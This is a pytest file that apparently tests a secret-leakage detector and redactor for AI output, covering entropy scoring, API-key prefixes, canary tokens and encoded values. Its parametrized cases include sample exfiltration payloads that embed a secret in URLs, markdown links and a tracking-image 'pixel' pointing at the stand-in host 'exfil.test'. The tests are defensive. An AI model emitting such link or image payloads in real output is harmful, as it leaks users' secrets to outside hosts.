"""Step 2: Shannon-entropy generic secret detection (no known prefix required)."""

import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from app.pipeline import _entropy, leakage_spans

HIGH_ENTROPY = "xT9$kQ2#vL8!zR4&mN7@pW6*yJ3^bF5"  # random-looking, no sk-/AKIA prefix


def test_high_entropy_token_caught():
    text = f"Sure, the rotating session material is {HIGH_ENTROPY} — handle with care."
    spans = leakage_spans(text, None, entropy_threshold=4.0)
    kinds = [s["type"] for s in spans]
    assert "high_entropy_secret" in kinds
    span = next(s for s in spans if s["type"] == "high_entropy_secret")
    assert text[span["start"] : span["end"]] == HIGH_ENTROPY


def test_low_entropy_long_token_not_flagged():
    text = (
        "border color: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa and zzzzzzzzzzzzzzzzzzzzzzzzzz"
    )
    assert not any(
        s["type"] == "high_entropy_secret"
        for s in leakage_spans(text, None, entropy_threshold=4.0)
    )


def test_benign_text_quiet():
    spans = leakage_spans(
        "Your refund policy: 30 days, prorated monthly after that.",
        "CANARY-9F2A41C8",
        entropy_threshold=4.0,
    )
    assert spans == []


def test_explicit_prefix_wins_over_entropy_label():
    tok = "SK-LIVE-Zx9Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk0L"
    spans = leakage_spans(f"key={tok}", None, entropy_threshold=4.0)
    assert any(s["type"] == "api_key" for s in spans)
    assert not any(s["type"] == "high_entropy_secret" for s in spans)


def test_threshold_is_tunable():
    text = f"material: {HIGH_ENTROPY}"
    assert not any(
        s["type"] == "high_entropy_secret"
        for s in leakage_spans(text, None, entropy_threshold=6.0)
    )


def test_entropy_function_sanity():
    assert _entropy("aaaa") == 0.0
    assert _entropy("ab") == 1.0
    assert _entropy(HIGH_ENTROPY) > 4.0


from urllib.parse import quote

import pytest

from app.pipeline import redact_spans

URL_SECRET = "Zx9Qw3Lp7Kd2Vn8Bt4Ry6Hs1Mj5Fg0Ab2Cd"


@pytest.mark.parametrize(
    "template",
    [
        "https://exfil.test/?k={}",
        "https://exfil.test/collect/{}/receipt",
        "[link](https://exfil.test?k={})",
        "![pixel](https://exfil.test/collect?k={}&ok=1)",
        "[link](<https://exfil.test?k={}>)",
        "[link](/collect/{}?ok=1)",
        "https://exfil.test/#token={}",
        "https://exfil.test/?x=1&k={}&y=2",
    ],
)
def test_url_components_and_markdown_destinations_are_scanned(template):
    text = template.format(URL_SECRET)
    spans = leakage_spans(text, None)
    assert any(span["type"] == "high_entropy_secret" for span in spans)
    sanitized = redact_spans(text, spans)
    assert URL_SECRET not in sanitized
    assert "exfil.test" in sanitized or "/collect/" in sanitized
    assert all(0 <= span["start"] < span["end"] <= len(text) for span in spans)


def test_percent_encoded_secret_redacts_the_original_query_value():
    encoded = "".join(f"%{ord(char):02X}" for char in URL_SECRET)
    text = f"Safe [docs](https://exfil.test?k={encoded}&lang=en) after."
    sanitized = redact_spans(text, leakage_spans(text, None))
    assert encoded not in sanitized
    assert (
        sanitized
        == "Safe [docs](https://exfil.test?k=[REDACTED:high_entropy_secret]&lang=en) after."
    )


def test_double_encoded_canary_is_detected_and_redacted():
    canary = "CANARY-9F2A41C8"
    encoded = quote("".join(f"%{ord(char):02X}" for char in canary), safe="")
    text = f"[link](https://exfil.test/{encoded}/done)"
    spans = leakage_spans(text, canary)
    assert any(span["type"] == "canary_token" for span in spans)
    assert encoded not in redact_spans(text, spans)


def test_url_scheme_and_ordinary_path_are_not_entropy_evidence():
    assert (
        leakage_spans(
            "[Documentation](https://docs.example.com/install/guide?lang=en#help)", None
        )
        == []
    )
